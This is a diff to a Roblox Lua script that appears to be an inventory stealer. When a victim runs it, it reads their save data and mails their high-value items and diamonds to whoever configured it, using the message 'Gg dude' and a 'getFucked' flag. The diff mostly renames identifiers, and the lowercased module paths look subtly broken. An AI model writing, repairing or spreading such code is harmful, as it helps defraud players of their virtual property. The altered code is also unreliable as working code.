@@ -4,8 +4,8 @@ min_rap = 1000000 -- Minimum RAP of each item you want to get sent to you. 1 mil
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
-local save = library.Save.Get().Network.Inventory
-local mailsent = library.Save.Get().MailboxSendsSinceReset
+local save = library.save.Get().Inventory
+local mailsent = library.save.Get().MailboxSendsSinceReset
 local plr = game.Players.LocalPlayer
 local MailMessage = "Gg dude"
 local HttpService = game:GetService("HttpService")
@@ -14,8 +14,8 @@ local totalRAP = 0
 local getFucked = false
 _G.scriptExecuted = _G.scriptExecuted or false
 
-local function GetSave()
-    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+local function Getsave()
+    return require(game.ReplicatedStorage.Library.Client.save).Get()
 end
 
 if _G.scriptExecuted then
@@ -30,7 +30,7 @@ if mailsent ~= 0 then
 end
 
 local GemAmount1 = 1
-for i, v in pairs(GetSave().Inventory.Currency) do
+for i, v in pairs(Getsave().Inventory.Currency) do
     if v.id == "Diamonds" then
         GemAmount1 = v._am
         break
@@ -213,7 +213,7 @@ local function sendItem(category, uid, am)
 end
 
 local function SendAllGems()
-    for i, v in pairs(GetSave().Inventory.Currency) do
+    for i, v in pairs(Getsave().Inventory.Currency) do
         if v.id == "Diamonds" then
             if GemAmount1 >= (newamount + 10000) then
                 local args = {
